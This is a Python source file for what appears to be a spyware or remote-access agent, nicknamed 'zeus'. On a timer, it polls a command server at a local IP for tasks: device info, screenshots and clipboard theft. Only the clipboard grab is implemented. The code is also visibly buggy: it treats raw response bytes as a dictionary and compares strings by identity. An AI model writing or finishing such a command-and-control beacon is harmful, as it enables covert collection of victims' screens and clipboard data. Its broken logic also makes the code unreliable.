#!/usr/local/bin/python

try:
    import urllib.request as requests
except ImportError:
    import urllib2 as requests

import threading

from Providers.DeviceInfoProvider import DeviceInfoProvider

class TaskManagmentHandler():
    # Handle tasks from server

    NUMBER_OF_SECOND_IN_MINUTES = 60

    MINUTES_TO_FIRST_TASK = 5 * NUMBER_OF_SECOND_IN_MINUTES
    MINUTES_TO_NORMAL_TASK = 20 * NUMBER_OF_SECOND_IN_MINUTES
    MINUTES_TO_FAILED_TASK = 20 * NUMBER_OF_SECOND_IN_MINUTES

    global currentAwaitingTime
    currentAwaitingTime = MINUTES_TO_FIRST_TASK

    def startTask(self):
        taskThread = threading.Timer(self.MINUTES_TO_FIRST_TASK, self.executeTaskFromServer)
        taskThread.start()

    def executeTaskFromServer(self):
        taskResponse = requests.urlopen("http://192.168.0.102/control.php?task=getTask&agent=zeus&deviceID=xxxx").read()

        if taskResponse["task"]:
            if taskResponse["task"] is "deviceInfo":
                # Get device info
                pass
            elif taskResponse["task"] is "screenshot":
                # Take screenshot
                pass
            elif taskResponse["task"] is "clipboard":
                # Get clipboard data
                devInfoProvider = DeviceInfoProvider()
                clipboardData = devInfoProvider.getClipboardData()


        self.currentAwaitingTime = self.MINUTES_TO_NORMAL_TASK

        taskThread = threading.Timer(self.currentAwaitingTime, self.executeTaskFromServer)
        taskThread.start()

    # start normal task after 5 minutes
    # start cycled task every 20 minutes (task call itself after 20 minutes)


if __name__ == "__main__":
    taskMgr = TaskManagmentHandler()
    taskMgr.startTask()
